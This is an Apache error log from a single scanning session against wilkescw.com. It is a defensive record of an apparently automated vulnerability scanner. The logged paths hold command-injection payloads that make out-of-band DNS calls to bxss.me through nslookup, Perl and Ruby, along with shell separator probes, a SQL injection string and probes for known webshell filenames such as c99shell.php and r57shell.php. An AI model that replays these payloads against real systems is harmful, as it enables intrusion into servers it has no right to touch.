[Thu Jul 08 00:29:52.405118 2021] [php7:error] [pid 30022] [client 27.147.202.214:8845] script '/var/www/html/wilkescw.com/roster/<!--.php' not found or unable to stat
[Thu Jul 08 00:29:52.638882 2021] [core:error] [pid 29854] (36)File name too long: [client 27.147.202.214:14352] AH00036: access to /;(nslookup hitbrpgrkluxue99e6.bxss.me||perl -e "gethostbyname('hitbrpgrkluxue99e6.bxss.me')")|(nslookup hitbrpgrkluxue99e6.bxss.me||perl -e "gethostbyname('hitbrpgrkluxue99e6.bxss.me')")&(nslookup hitbrpgrkluxue99e6.bxss.me||perl -e "gethostbyname('hitbrpgrkluxue99e6.bxss.me')")/cache.php failed (filesystem path '/var/www/html/wilkescw.com/;(nslookup hitbrpgrkluxue99e6.bxss.me||perl -e "gethostbyname('hitbrpgrkluxue99e6.bxss.me')")|(nslookup hitbrpgrkluxue99e6.bxss.me||perl -e "gethostbyname('hitbrpgrkluxue99e6.bxss.me')")&(nslookup hitbrpgrkluxue99e6.bxss.me||perl -e "gethostbyname('hitbrpgrkluxue99e6.bxss.me')")')
[Thu Jul 08 00:29:52.720331 2021] [php7:error] [pid 29871] [client 27.147.202.214:9976] script '/var/www/html/wilkescw.com/roster/'.gethostbyname(lc('hituy'.'cstwhqwh56991.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(107).chr(65).chr(107).chr(72).'.php' not found or unable to stat
[Thu Jul 08 00:29:53.339889 2021] [php7:error] [pid 29871] [client 27.147.202.214:9976] script '/var/www/html/wilkescw.com/roster/".gethostbyname(lc("hitkk"."kukglibhd65b2.bxss.me."))."A".chr(67).chr(hex("58")).chr(103).chr(81).chr(99).chr(86).".php' not found or unable to stat
[Thu Jul 08 00:29:53.340351 2021] [php7:error] [pid 30004] [client 27.147.202.214:4182] script '/var/www/html/wilkescw.com/roster/cache9015023.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:53.950093 2021] [php7:error] [pid 30399] [client 27.147.202.214:11232] script '/var/www/html/wilkescw.com/admin/|(nslookup hitxocmxirctbac566.bxss.me||perl -e "gethostbyname('hitxocmxirctbac566.bxss.me')").php' not found or unable to stat
[Thu Jul 08 00:29:54.206761 2021] [php7:error] [pid 30000] [client 27.147.202.214:11230] script '/var/www/html/wilkescw.com/roster/"+"A".concat(70-3).concat(22*4).concat(116).concat(66).concat(103).concat(75)+(require"socket"\nSocket.gethostbyname("hitvr"+"ormumyyjcd2d5.bxss.me.")[3].to_s)+".php' not found or unable to stat
[Thu Jul 08 00:29:54.548041 2021] [php7:error] [pid 30000] [client 27.147.202.214:11230] script '/var/www/html/wilkescw.com/admin/`(nslookup hitgimrobvund64918.bxss.me||perl -e "gethostbyname('hitgimrobvund64918.bxss.me')")`.php' not found or unable to stat
[Thu Jul 08 00:29:55.090255 2021] [php7:error] [pid 30218] [client 27.147.202.214:7316] script '/var/www/html/wilkescw.com/roster/echo jpqltu$()\\ bxhduu\\nz^xyu||a #' &echo jpqltu$()\\ bxhduu\\nz^xyu||a #|" &echo jpqltu$()\\ bxhduu\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 00:29:55.618552 2021] [php7:error] [pid 29854] [client 27.147.202.214:14352] script '/var/www/html/wilkescw.com/roster/'+'A'.concat(70-3).concat(22*4).concat(109).concat(88).concat(119).concat(66)+(require'socket'\nSocket.gethostbyname('hitku'+'gjnamcrba01d6.bxss.me.')[3].to_s)+'.php' not found or unable to stat
[Thu Jul 08 00:29:56.494018 2021] [php7:error] [pid 30035] [client 27.147.202.214:13810] script '/var/www/html/wilkescw.com/roster/&echo byploh$()\\ xocfvh\\nz^xyu||a #' &echo byploh$()\\ xocfvh\\nz^xyu||a #|" &echo byploh$()\\ xocfvh\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 00:29:56.811726 2021] [php7:error] [pid 30035] [client 27.147.202.214:13810] script '/var/www/html/wilkescw.com/roster/|echo gmxeld$()\\ otfzpr\\nz^xyu||a #' |echo gmxeld$()\\ otfzpr\\nz^xyu||a #|" |echo gmxeld$()\\ otfzpr\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 00:29:57.129073 2021] [php7:error] [pid 30035] [client 27.147.202.214:13810] script '/var/www/html/wilkescw.com/roster/(nslookup hitslznzfegov73150.bxss.me||perl -e "gethostbyname('hitslznzfegov73150.bxss.me')").php' not found or unable to stat
[Thu Jul 08 00:29:57.550884 2021] [php7:error] [pid 29427] [client 27.147.202.214:9981] script '/var/www/html/wilkescw.com/roster/img/options/0i0ytchjmwys.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:57.588696 2021] [php7:error] [pid 29652] [client 27.147.202.214:2278] script '/var/www/html/wilkescw.com/roster/img/help/u4vr6jiabd1l.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:58.109484 2021] [php7:error] [pid 30022] [client 27.147.202.214:8845] script '/var/www/html/wilkescw.com/roster/$(nslookup hitaraofenhqh14607.bxss.me||perl -e "gethostbyname('hitaraofenhqh14607.bxss.me')").php' not found or unable to stat
[Thu Jul 08 00:29:58.228715 2021] [core:error] [pid 30413] (36)File name too long: [client 27.147.202.214:6368] AH00036: access to /;(nslookup hityiofwawqrjed724.bxss.me||perl -e "gethostbyname('hityiofwawqrjed724.bxss.me')")|(nslookup hityiofwawqrjed724.bxss.me||perl -e "gethostbyname('hityiofwawqrjed724.bxss.me')")&(nslookup hityiofwawqrjed724.bxss.me||perl -e "gethostbyname('hityiofwawqrjed724.bxss.me')")/students.php failed (filesystem path '/var/www/html/wilkescw.com/;(nslookup hityiofwawqrjed724.bxss.me||perl -e "gethostbyname('hityiofwawqrjed724.bxss.me')")|(nslookup hityiofwawqrjed724.bxss.me||perl -e "gethostbyname('hityiofwawqrjed724.bxss.me')")&(nslookup hityiofwawqrjed724.bxss.me||perl -e "gethostbyname('hityiofwawqrjed724.bxss.me')")')
[Thu Jul 08 00:29:58.632563 2021] [core:error] [pid 30000] (36)File name too long: [client 27.147.202.214:11230] AH00036: access to /admin/;(nslookup hitljimnpvccoa1ce9.bxss.me||perl -e "gethostbyname('hitljimnpvccoa1ce9.bxss.me')")|(nslookup hitljimnpvccoa1ce9.bxss.me||perl -e "gethostbyname('hitljimnpvccoa1ce9.bxss.me')")&(nslookup hitljimnpvccoa1ce9.bxss.me||perl -e "gethostbyname('hitljimnpvccoa1ce9.bxss.me')").php failed (filesystem path '/var/www/html/wilkescw.com/admin/;(nslookup hitljimnpvccoa1ce9.bxss.me||perl -e "gethostbyname('hitljimnpvccoa1ce9.bxss.me')")|(nslookup hitljimnpvccoa1ce9.bxss.me||perl -e "gethostbyname('hitljimnpvccoa1ce9.bxss.me')")&(nslookup hitljimnpvccoa1ce9.bxss.me||perl -e "gethostbyname('hitljimnpvccoa1ce9.bxss.me')").php')
[Thu Jul 08 00:29:58.748962 2021] [php7:error] [pid 30510] [client 27.147.202.214:10200] script '/var/www/html/wilkescw.com/roster/&(nslookup hitmcjhtamhkmbe1da.bxss.me||perl -e "gethostbyname('hitmcjhtamhkmbe1da.bxss.me')")&'\\"`0&(nslookup hitmcjhtamhkmbe1da.bxss.me||perl -e "gethostbyname('hitmcjhtamhkmbe1da.bxss.me')")&`'.php' not found or unable to stat
[Thu Jul 08 00:29:59.709047 2021] [php7:error] [pid 30510] [client 27.147.202.214:10200] script '/var/www/html/wilkescw.com/roster/|(nslookup hitqbypkpnpytceb3e.bxss.me||perl -e "gethostbyname('hitqbypkpnpytceb3e.bxss.me')").php' not found or unable to stat
[Thu Jul 08 00:30:00.326605 2021] [php7:error] [pid 30515] [client 27.147.202.214:2281] script '/var/www/html/wilkescw.com/roster/`(nslookup hitznthsmvofhf8c7f.bxss.me||perl -e "gethostbyname('hitznthsmvofhf8c7f.bxss.me')")`.php' not found or unable to stat
[Thu Jul 08 00:30:00.919316 2021] [core:error] [pid 30513] (36)File name too long: [client 27.147.202.214:2286] AH00036: access to /roster/;(nslookup hitwyevjjwuyj1f546.bxss.me||perl -e "gethostbyname('hitwyevjjwuyj1f546.bxss.me')")|(nslookup hitwyevjjwuyj1f546.bxss.me||perl -e "gethostbyname('hitwyevjjwuyj1f546.bxss.me')")&(nslookup hitwyevjjwuyj1f546.bxss.me||perl -e "gethostbyname('hitwyevjjwuyj1f546.bxss.me')").php failed (filesystem path '/var/www/html/wilkescw.com/roster/;(nslookup hitwyevjjwuyj1f546.bxss.me||perl -e "gethostbyname('hitwyevjjwuyj1f546.bxss.me')")|(nslookup hitwyevjjwuyj1f546.bxss.me||perl -e "gethostbyname('hitwyevjjwuyj1f546.bxss.me')")&(nslookup hitwyevjjwuyj1f546.bxss.me||perl -e "gethostbyname('hitwyevjjwuyj1f546.bxss.me')").php')
[Thu Jul 08 00:30:10.708134 2021] [authz_core:error] [pid 30546] [client 27.147.202.214:5826] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/img/help/.htaccess
[Thu Jul 08 00:30:11.501263 2021] [php7:error] [pid 30515] [client 27.147.202.214:5841] script '/var/www/html/wilkescw.com/roster/img/help/apc.php' not found or unable to stat
[Thu Jul 08 00:30:12.163693 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/webadmin.php' not found or unable to stat
[Thu Jul 08 00:30:12.171603 2021] [php7:error] [pid 30399] [client 27.147.202.214:5834] script '/var/www/html/wilkescw.com/roster/img/help/r57shell.php' not found or unable to stat
[Thu Jul 08 00:30:12.369380 2021] [php7:error] [pid 30536] [client 27.147.202.214:5851] script '/var/www/html/wilkescw.com/roster/img/help/phpinfo.php' not found or unable to stat
[Thu Jul 08 00:30:12.490526 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/r57.php' not found or unable to stat
[Thu Jul 08 00:30:12.626135 2021] [php7:error] [pid 30545] [client 27.147.202.214:10259] script '/var/www/html/wilkescw.com/roster/img/options/apc.php' not found or unable to stat
[Thu Jul 08 00:30:12.809065 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/r58.php' not found or unable to stat
[Thu Jul 08 00:30:13.133468 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/c99shell.php' not found or unable to stat
[Thu Jul 08 00:30:13.740110 2021] [php7:error] [pid 30536] [client 27.147.202.214:5851] script '/var/www/html/wilkescw.com/roster/img/help/pi.php' not found or unable to stat
[Thu Jul 08 00:30:14.095439 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/c99.php' not found or unable to stat
[Thu Jul 08 00:30:14.403825 2021] [php7:error] [pid 30536] [client 27.147.202.214:5851] script '/var/www/html/wilkescw.com/roster/img/help/php.php' not found or unable to stat
[Thu Jul 08 00:30:14.421377 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/nstview.php' not found or unable to stat
[Thu Jul 08 00:30:14.699247 2021] [authz_core:error] [pid 30545] [client 27.147.202.214:10259] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/img/options/.htaccess
[Thu Jul 08 00:30:14.734893 2021] [php7:error] [pid 30536] [client 27.147.202.214:5851] script '/var/www/html/wilkescw.com/roster/img/help/i.php' not found or unable to stat
[Thu Jul 08 00:30:14.750615 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/nst.php' not found or unable to stat
[Thu Jul 08 00:30:15.071210 2021] [php7:error] [pid 30536] [client 27.147.202.214:5851] script '/var/www/html/wilkescw.com/roster/img/help/test.php' not found or unable to stat
[Thu Jul 08 00:30:15.078655 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/rst.php' not found or unable to stat
[Thu Jul 08 00:30:15.324058 2021] [php7:error] [pid 30545] [client 27.147.202.214:10259] script '/var/www/html/wilkescw.com/roster/img/options/phpinfo.php' not found or unable to stat
[Thu Jul 08 00:30:15.396187 2021] [php7:error] [pid 30536] [client 27.147.202.214:5851] script '/var/www/html/wilkescw.com/roster/img/help/temp.php' not found or unable to stat
[Thu Jul 08 00:30:15.402653 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/r57eng.php' not found or unable to stat
[Thu Jul 08 00:30:15.643556 2021] [php7:error] [pid 29652] [client 27.147.202.214:5827] script '/var/www/html/wilkescw.com/roster/img/options/r57shell.php' not found or unable to stat
[Thu Jul 08 00:30:15.723032 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/shell.php' not found or unable to stat
[Thu Jul 08 00:30:15.723278 2021] [php7:error] [pid 30536] [client 27.147.202.214:5851] script '/var/www/html/wilkescw.com/roster/img/help/info.php' not found or unable to stat
[Thu Jul 08 00:30:15.956281 2021] [php7:error] [pid 30516] [client 27.147.202.214:3766] script '/var/www/html/wilkescw.com/roster/img/options/webadmin.php' not found or unable to stat
[Thu Jul 08 00:30:15.969151 2021] [php7:error] [pid 29652] [client 27.147.202.214:5827] script '/var/www/html/wilkescw.com/roster/img/options/r57.php' not found or unable to stat
[Thu Jul 08 00:30:16.039748 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/dra.php' not found or unable to stat
[Thu Jul 08 00:30:16.291318 2021] [php7:error] [pid 30191] [client 27.147.202.214:5849] script '/var/www/html/wilkescw.com/roster/img/options/r58.php' not found or unable to stat
[Thu Jul 08 00:30:16.362793 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/r.php' not found or unable to stat
[Thu Jul 08 00:30:16.592845 2021] [php7:error] [pid 30545] [client 27.147.202.214:10259] script '/var/www/html/wilkescw.com/roster/img/options/pi.php' not found or unable to stat
[Thu Jul 08 00:30:16.608228 2021] [php7:error] [pid 30191] [client 27.147.202.214:5849] script '/var/www/html/wilkescw.com/roster/img/options/c99shell.php' not found or unable to stat
[Thu Jul 08 00:30:16.674417 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/lol.php' not found or unable to stat
[Thu Jul 08 00:30:16.997102 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/zehir.php' not found or unable to stat
[Thu Jul 08 00:30:17.187786 2021] [php7:error] [pid 30545] [client 27.147.202.214:10259] script '/var/www/html/wilkescw.com/roster/img/options/php.php' not found or unable to stat
[Thu Jul 08 00:30:17.294886 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/c-h.v2.php' not found or unable to stat
[Thu Jul 08 00:30:17.481225 2021] [php7:error] [pid 30191] [client 27.147.202.214:5849] script '/var/www/html/wilkescw.com/roster/img/options/c99.php' not found or unable to stat
[Thu Jul 08 00:30:17.507910 2021] [php7:error] [pid 30545] [client 27.147.202.214:10259] script '/var/www/html/wilkescw.com/roster/img/options/i.php' not found or unable to stat
[Thu Jul 08 00:30:17.616213 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/php-backdoor.php' not found or unable to stat
[Thu Jul 08 00:30:17.784938 2021] [php7:error] [pid 30546] [client 27.147.202.214:5826] script '/var/www/html/wilkescw.com/roster/cache3v5gD.php' not found or unable to stat
[Thu Jul 08 00:30:17.796063 2021] [php7:error] [pid 30191] [client 27.147.202.214:5849] script '/var/www/html/wilkescw.com/roster/img/options/nstview.php' not found or unable to stat
[Thu Jul 08 00:30:17.828218 2021] [php7:error] [pid 30545] [client 27.147.202.214:10259] script '/var/www/html/wilkescw.com/roster/img/options/test.php' not found or unable to stat
[Thu Jul 08 00:30:17.929732 2021] [php7:error] [pid 30407] [client 27.147.202.214:5845] script '/var/www/html/wilkescw.com/roster/img/help/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 00:30:18.113120 2021] [php7:error] [pid 30191] [client 27.147.202.214:5849] script '/var/www/html/wilkescw.com/roster/img/options/nst.php' not found or unable to stat
[Thu Jul 08 00:30:18.148439 2021] [php7:error] [pid 30516] [client 27.147.202.214:3766] script '/var/www/html/wilkescw.com/roster/img/options/temp.php' not found or unable to stat
[Thu Jul 08 00:30:18.435745 2021] [php7:error] [pid 30200] [client 27.147.202.214:5835] script '/var/www/html/wilkescw.com/roster/gYGkScache.php' not found or unable to stat
[Thu Jul 08 00:30:18.436154 2021] [php7:error] [pid 30191] [client 27.147.202.214:5849] script '/var/www/html/wilkescw.com/roster/img/options/rst.php' not found or unable to stat
[Thu Jul 08 00:30:18.466493 2021] [php7:error] [pid 30516] [client 27.147.202.214:3766] script '/var/www/html/wilkescw.com/roster/img/options/info.php' not found or unable to stat
[Thu Jul 08 00:30:18.741533 2021] [php7:error] [pid 29871] [client 27.147.202.214:10737] script '/var/www/html/wilkescw.com/roster/img/options/r57eng.php' not found or unable to stat
[Thu Jul 08 00:30:19.049794 2021] [php7:error] [pid 29871] [client 27.147.202.214:10737] script '/var/www/html/wilkescw.com/roster/img/options/shell.php' not found or unable to stat
[Thu Jul 08 00:30:19.143449 2021] [negotiation:error] [pid 29860] [client 27.147.202.214:5842] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/roster/cache (None could be negotiated).
[Thu Jul 08 00:30:19.370241 2021] [php7:error] [pid 29871] [client 27.147.202.214:10737] script '/var/www/html/wilkescw.com/roster/img/options/dra.php' not found or unable to stat
[Thu Jul 08 00:30:19.689312 2021] [php7:error] [pid 29871] [client 27.147.202.214:10737] script '/var/www/html/wilkescw.com/roster/img/options/r.php' not found or unable to stat
[Thu Jul 08 00:30:20.009508 2021] [php7:error] [pid 29871] [client 27.147.202.214:10737] script '/var/www/html/wilkescw.com/roster/img/options/lol.php' not found or unable to stat
[Thu Jul 08 00:30:20.324146 2021] [php7:error] [pid 29871] [client 27.147.202.214:10737] script '/var/www/html/wilkescw.com/roster/img/options/zehir.php' not found or unable to stat
[Thu Jul 08 00:30:20.641850 2021] [php7:error] [pid 29871] [client 27.147.202.214:10737] script '/var/www/html/wilkescw.com/roster/img/options/c-h.v2.php' not found or unable to stat
[Thu Jul 08 00:30:20.962740 2021] [php7:error] [pid 29871] [client 27.147.202.214:10737] script '/var/www/html/wilkescw.com/roster/img/options/php-backdoor.php' not found or unable to stat
[Thu Jul 08 00:30:21.282288 2021] [php7:error] [pid 29427] [client 27.147.202.214:12548] script '/var/www/html/wilkescw.com/roster/img/options/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 00:30:22.453359 2021] [php7:error] [pid 30022] [client 27.147.202.214:12417] script '/var/www/html/wilkescw.com/roster/old_cache.php' not found or unable to stat
[Thu Jul 08 00:30:22.755939 2021] [php7:error] [pid 29427] [client 27.147.202.214:12548] script '/var/www/html/wilkescw.com/roster/cache_old.php' not found or unable to stat
[Thu Jul 08 00:30:23.082964 2021] [php7:error] [pid 29427] [client 27.147.202.214:12548] script '/var/www/html/wilkescw.com/roster/cache_bak.php' not found or unable to stat
[Thu Jul 08 00:30:29.293439 2021] [authz_core:error] [pid 30415] [client 27.147.202.214:12897] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/img/help/.htaccess~
[Thu Jul 08 00:30:29.600573 2021] [authz_core:error] [pid 30415] [client 27.147.202.214:12897] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/img/help/.htaccess.old
[Thu Jul 08 00:30:29.915311 2021] [authz_core:error] [pid 30415] [client 27.147.202.214:12897] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/img/help/.htaccess.save
[Thu Jul 08 00:30:32.477627 2021] [authz_core:error] [pid 30516] [client 27.147.202.214:3766] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/img/options/.htaccess~
[Thu Jul 08 00:30:32.766159 2021] [authz_core:error] [pid 30516] [client 27.147.202.214:3766] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/img/options/.htaccess.old
[Thu Jul 08 00:30:33.057685 2021] [authz_core:error] [pid 30516] [client 27.147.202.214:3766] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/img/options/.htaccess.save
[Thu Jul 08 00:31:17.297665 2021] [php7:error] [pid 30532] [client 27.147.202.214:9794] script '/var/www/html/wilkescw.com/roster/-1 OR 2+570-570-1=0+0+0+1 -- .php' not found or unable to stat, referer: https://wilkescw.com/
